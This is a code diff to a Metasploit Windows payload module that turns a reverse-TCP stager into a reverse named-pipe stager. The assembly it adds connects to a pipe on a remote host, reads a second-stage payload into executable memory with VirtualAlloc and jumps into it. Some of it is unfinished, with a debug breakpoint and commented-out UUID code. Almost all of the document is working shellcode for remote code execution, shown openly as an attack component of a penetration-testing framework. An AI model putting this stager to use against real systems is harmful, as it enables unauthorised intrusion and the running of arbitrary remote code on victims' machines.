@@ -2,7 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/send_uuid'
+#require 'msf/core/payload/windows/send_uuid'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -27,8 +27,8 @@ module Payload::Windows::ReverseNamedPipe
   #
   def generate
     conf = {
-      name:        datastore['NAME'],
-      host:        datastore['LHOST'],
+      name:        datastore['PIPENAME'],
+      host:        datastore['PIPEHOST'] || '.',
       retry_count: datastore['ReverseConnectRetries'],
       reliable:    false
     }
@@ -57,14 +57,14 @@ module Payload::Windows::ReverseNamedPipe
   #
   # Generate and compile the stager
   #
-  def generate_reverse_tcp(opts={})
+  def generate_reverse_named_pipe(opts={})
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
         pop ebp
-      #{asm_reverse_tcp(opts)}
+      #{asm_reverse_named_pipe(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
@@ -95,66 +95,48 @@ module Payload::Windows::ReverseNamedPipe
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
-  def asm_reverse_tcp(opts={})
+  def asm_reverse_named_pipe(opts={})
 
-    retry_count  = [opts[:retry_count].to_i, 1].max
-    reliable     = opts[:reliable]
-    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
-    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    retry_count    = [opts[:retry_count].to_i, 1].max
+    #reliable       = opts[:reliable]
+    reliable       = false
+    # we have to double-escape because of metasm
+    full_pipe_name = "\\\\\\\\#{opts[:host]}\\\\pipe\\\\#{opts[:name]}"
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
-      ; Output: EDI will be the socket for the connection to the server
-      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
+      ; Output: EDI will be the handle for the pipe to the server
 
-      reverse_tcp:
-        push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
-        push 'ws2_'             ; ...
-        push esp                ; Push a pointer to the "ws2_32" string on the stack.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call ebp                ; LoadLibraryA( "ws2_32" )
+        ;int 3
 
-        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
-        sub esp, eax            ; alloc some space for the WSAData structure
-        push esp                ; push a pointer to this stuct
-        push eax                ; push the wVersionRequested parameter
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
-        call ebp                ; WSAStartup( 0x0190, &WSAData );
-
-      set_address:
+      retry_start:
         push #{retry_count}     ; retry counter
+        mov esi, esp            ; keep track of where the variables are
 
-      create_socket:
-        push #{encoded_host}    ; host in little-endian format
-        push #{encoded_port}    ; family AF_INET and port number
-        mov esi, esp            ; save pointer to sockaddr struct
+      try_reverse_named_pipe:
+        ; Start by setting up the call to CreateFile
+        xor ebx, ebx            ; EBX will be used for pushing zero
+        push ebx                ; hTemplateFile
+        push ebx                ; dwFlagsAndAttributes
+        push 3                  ; dwCreationDisposition (OPEN_EXISTING)
+        push ebx                ; lpSecurityAttributes
+        push ebx                ; dwShareMode
+        push 0xC0000000         ; dwDesiredAccess (GENERIC_READ|GENERIC_WRITE)
+        call get_pipe_name
+        db "#{full_pipe_name}", 0x00
+      get_pipe_name:
+                                ; lpFileName (via call)
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
+        call ebp                ; CreateFileA(...)
 
-        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
-        push eax                ; push null for reserved parameter
-        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
-        push eax                ; we do not specify a protocol
-        inc eax                 ;
-        push eax                ; push SOCK_STREAM
-        inc eax                 ;
-        push eax                ; push AF_INET
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
-        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
-        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
-
-      try_connect:
-        push 16                 ; length of the sockaddr struct
-        push esi                ; pointer to the sockaddr struct
-        push edi                ; the socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
-        call ebp                ; connect( s, &sockaddr, 16 );
-
-        test eax,eax            ; non-zero means a failure
-        jz connected
+        ; If eax is -1, then we had a failure.
+        cmp eax, -1             ; zero means a failure
+        jnz connected
 
       handle_connect_failure:
         ; decrement our attempt count and try again
-        dec [esi+8]
-        jnz try_connect
+        dec [esi]
+        jnz try_reverse_named_pipe
     ^
 
     if opts[:exitfunk]
@@ -171,30 +153,39 @@ module Payload::Windows::ReverseNamedPipe
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
+        xchg edi, eax           ; edi now has the file handle we'll need in future
     ^
 
-    asm << asm_send_uuid if include_send_uuid
+    # TODO: add the "write file" equiv of this
+    #asm << asm_send_uuid if include_send_uuid
 
     asm << %Q^
-      recv:
         ; Receive the size of the incoming second stage...
-        push 0                  ; flags
-        push 4                  ; length = sizeof( DWORD );
-        push esi                ; the 4 byte buffer on the stack to hold the second stage length
-        push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
-        call ebp                ; recv( s, &dwLength, 4, 0 );
+        push ebx                ; buffer for lpNumberOfBytesRead
+        mov ecx, esp
+        push ebx                ; buffer for lpBuffer
+        mov esi, esp
+        push ebx                ; lpOverlapped
+        push ecx                ; lpNumberOfBytesRead
+        push 4                  ; nNumberOfBytesToRead = sizeof( DWORD );
+        push esi                ; lpBuffer
+        push edi                ; hFile
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        call ebp                ; ReadFile(...) to read the size
     ^
 
     if reliable
       asm << %Q^
-        ; reliability: check to see if the recv worked, and reconnect
+        ; reliability: check to see if the file read worked, retry otherwise
         ; if it fails
-        cmp eax, 0
-        jle cleanup_socket
+        test eax, eax
+        jz cleanup_file
+        mov eax, [esi+4]        ; check to see if bytes were read
+        test eax, eax
+        jz cleanup_file
       ^
     end
 
@@ -203,7 +194,7 @@ module Payload::Windows::ReverseNamedPipe
         mov esi, [esi]          ; dereference the pointer to the second stage length
         push 0x40               ; PAGE_EXECUTE_READWRITE
         push 0x1000             ; MEM_COMMIT
-        push esi                ; push the newly recieved second stage length.
+        push esi                ; push the newly received second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
@@ -212,12 +203,15 @@ module Payload::Windows::ReverseNamedPipe
         push ebx                ; push the address of the new stage so we can return into it
 
       read_more:
-        push 0                  ; flags
-        push esi                ; length
-        push ebx                ; the current address into our second stage's RWX buffer
-        push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
-        call ebp                ; recv( s, buffer, length, 0 );
+        push eax                ; space for the number of bytes
+        mov eax, esp            ; store the pointer
+        push 0                  ; lpOverlapped
+        push eax                ; lpNumberOfBytesRead
+        push esi                ; nNumberOfBytesToRead
+        push ebx                ; lpBuffer
+        push edi                ; hFile
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        call ebp                ; ReadFile(...) to read the size
     ^
 
     if reliable
@@ -225,8 +219,12 @@ module Payload::Windows::ReverseNamedPipe
         ; reliability: check to see if the recv worked, and reconnect
         ; if it fails
         cmp eax, 0
-        jge read_successful
+        jz read_failed
+        pop eax                 ; get the number of bytes read
+        cmp eax, 0
+        jnz read_succeeded
 
+      read_failed:
         ; something failed, free up memory
         pop eax                 ; get the address of the payload
         push 0x4000             ; dwFreeType (MEM_DECOMMIT)
@@ -235,19 +233,24 @@ module Payload::Windows::ReverseNamedPipe
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
 
-      cleanup_socket:
-        ; clear up the socket
-        push edi                ; socket handle
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
-        call ebp                ; closesocket(socket)
+      cleanup_file:
+        ; clear up the named pipe handle
+        push edi                ; named pipe handle
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
+        call ebp                ; CloseHandle(...)
 
         ; restore the stack back to the connection retry count
+        pop esi
         pop esi
         pop esi
         dec [esp]               ; decrement the counter
 
         ; try again
-        jmp create_socket
+        jmp try_reverse_named_pipe
+      ^
+    else
+      asm << %Q^
+        pop eax                 ; pop bytes read
       ^
     end
 
